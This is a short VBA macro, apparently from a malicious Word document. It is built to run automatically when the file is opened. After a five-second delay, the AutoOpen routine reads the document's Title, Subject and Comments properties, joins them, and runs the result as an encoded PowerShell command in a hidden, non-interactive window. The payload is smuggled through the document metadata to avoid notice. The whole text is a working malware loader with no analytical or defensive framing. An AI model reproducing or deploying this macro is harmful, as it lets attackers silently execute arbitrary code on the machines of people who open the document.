Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)

Sub AutoOpen()
    ExecutePowerShellCommand
End Sub

Sub ExecutePowerShellCommand()
    
    Dim title As String
    Dim subject As String
    Dim comments As String
    
    On Error Resume Next
    title = ActiveDocument.BuiltInDocumentProperties("Title").Value
    subject = ActiveDocument.BuiltInDocumentProperties("Subject").Value
    comments = ActiveDocument.BuiltInDocumentProperties("Comments").Value
    On Error GoTo 0

    Dim all As String
    Sleep 5000
    all = title & subject & comments
    Shell "powershell -W hidden -noni -e " & all
End Sub
